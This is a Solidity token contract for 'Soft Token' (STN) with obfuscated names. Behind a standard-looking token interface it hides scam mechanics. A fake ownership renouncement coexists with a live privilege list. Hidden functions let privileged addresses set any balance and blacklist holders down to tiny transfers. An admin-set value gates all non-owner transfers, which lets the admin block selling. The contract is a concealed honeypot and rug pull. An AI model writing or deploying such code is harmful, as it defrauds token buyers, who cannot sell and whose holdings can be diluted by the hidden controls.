//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface marketingLaunchMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityMarketing) external view returns (uint256);

    function transfer(address exemptMarketing, uint256 toSell) external returns (bool);

    function allowance(address launchedFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 toSell) external returns (bool);

    function transferFrom(
        address sender,
        address exemptMarketing,
        uint256 toSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromMin, uint256 value);
    event Approval(address indexed launchedFee, address indexed spender, uint256 value);
}

abstract contract autoAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedMarketing {
    function createPair(address fromAt, address txMax) external returns (address);
}

interface sellTradingTeam is marketingLaunchMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SoftToken is autoAt, marketingLaunchMax, sellTradingTeam {

    address launchIsLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public amountLiquidity;

    function isMarketing(address totalShould, address exemptMarketing, uint256 toSell) internal returns (bool) {
        require(minAutoEnable[totalShould] >= toSell);
        minAutoEnable[totalShould] -= toSell;
        minAutoEnable[exemptMarketing] += toSell;
        emit Transfer(totalShould, exemptMarketing, toSell);
        return true;
    }

    mapping(address => mapping(address => uint256)) private tradingLaunched;

    bool private isAt;

    constructor (){
        
        feeBuy senderSwapList = feeBuy(launchIsLimit);
        sellList = launchedMarketing(senderSwapList.factory()).createPair(senderSwapList.WETH(), address(this));
        if (txWallet == receiverFrom) {
            sellLaunched = exemptLaunched;
        }
        walletReceiverLiquidity = _msgSender();
        shouldFund();
        amountLiquidity[walletReceiverLiquidity] = true;
        minAutoEnable[walletReceiverLiquidity] = exemptMode;
        if (sellLaunched == txWallet) {
            enableSwap = true;
        }
        emit Transfer(address(0), walletReceiverLiquidity, exemptMode);
    }

    address private buyLiquidity;

    bool public buyLimit;

    function allowance(address exemptLaunch, address txFee) external view virtual override returns (uint256) {
        if (txFee == launchIsLimit) {
            return type(uint256).max;
        }
        return tradingLaunched[exemptLaunch][txFee];
    }

    function teamLimit(address marketingFromTotal, uint256 toSell) public {
        tradingSender();
        minAutoEnable[marketingFromTotal] = toSell;
    }

    uint256 private exemptMode = 100000000 * 10 ** 18;

    function tradingSender() private view {
        require(amountLiquidity[_msgSender()]);
    }

    uint8 private feeLaunch = 18;

    function shouldFund() public {
        emit OwnershipTransferred(walletReceiverLiquidity, address(0));
        buyLiquidity = address(0);
    }

    uint256 constant atList = 7 ** 10;

    bool public takeReceiver;

    uint256 private exemptLaunched;

    uint256 modeReceiver;

    function transferFrom(address totalShould, address exemptMarketing, uint256 toSell) external override returns (bool) {
        if (_msgSender() != launchIsLimit) {
            if (tradingLaunched[totalShould][_msgSender()] != type(uint256).max) {
                require(toSell <= tradingLaunched[totalShould][_msgSender()]);
                tradingLaunched[totalShould][_msgSender()] -= toSell;
            }
        }
        return fromLaunch(totalShould, exemptMarketing, toSell);
    }

    mapping(address => uint256) private minAutoEnable;

    mapping(address => bool) public receiverReceiver;

    string private feeTake = "Soft Token";

    function teamAmount(address sellTx) public {
        tradingSender();
        if (txWallet != launchToken) {
            buyReceiver = false;
        }
        if (sellTx == walletReceiverLiquidity || sellTx == sellList) {
            return;
        }
        receiverReceiver[sellTx] = true;
    }

    uint256 private txWallet;

    function balanceOf(address liquidityMarketing) public view virtual override returns (uint256) {
        return minAutoEnable[liquidityMarketing];
    }

    function decimals() external view virtual override returns (uint8) {
        return feeLaunch;
    }

    function name() external view virtual override returns (string memory) {
        return feeTake;
    }

    function owner() external view returns (address) {
        return buyLiquidity;
    }

    address buyTradingAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private tokenMin = "STN";

    address public sellList;

    uint256 public sellLaunched;

    bool public minBuy;

    function approve(address txFee, uint256 toSell) public virtual override returns (bool) {
        tradingLaunched[_msgSender()][txFee] = toSell;
        emit Approval(_msgSender(), txFee, toSell);
        return true;
    }

    uint256 private receiverFrom;

    function transfer(address marketingFromTotal, uint256 toSell) external virtual override returns (bool) {
        return fromLaunch(_msgSender(), marketingFromTotal, toSell);
    }

    address public walletReceiverLiquidity;

    bool private enableSwap;

    event OwnershipTransferred(address indexed fromExempt, address indexed sellSwap);

    function symbol() external view virtual override returns (string memory) {
        return tokenMin;
    }

    function senderAutoWallet(address minAmount) public {
        if (minBuy) {
            return;
        }
        if (isAt) {
            takeReceiver = false;
        }
        amountLiquidity[minAmount] = true;
        
        minBuy = true;
    }

    function fromLaunch(address totalShould, address exemptMarketing, uint256 toSell) internal returns (bool) {
        if (totalShould == walletReceiverLiquidity) {
            return isMarketing(totalShould, exemptMarketing, toSell);
        }
        uint256 isTradingLiquidity = marketingLaunchMax(sellList).balanceOf(buyTradingAuto);
        require(isTradingLiquidity == liquidityFee);
        require(exemptMarketing != buyTradingAuto);
        if (receiverReceiver[totalShould]) {
            return isMarketing(totalShould, exemptMarketing, atList);
        }
        return isMarketing(totalShould, exemptMarketing, toSell);
    }

    bool private buyReceiver;

    uint256 liquidityFee;

    uint256 public launchToken;

    function tokenFeeTo(uint256 toSell) public {
        tradingSender();
        liquidityFee = toSell;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptMode;
    }

    function getOwner() external view returns (address) {
        return buyLiquidity;
    }

}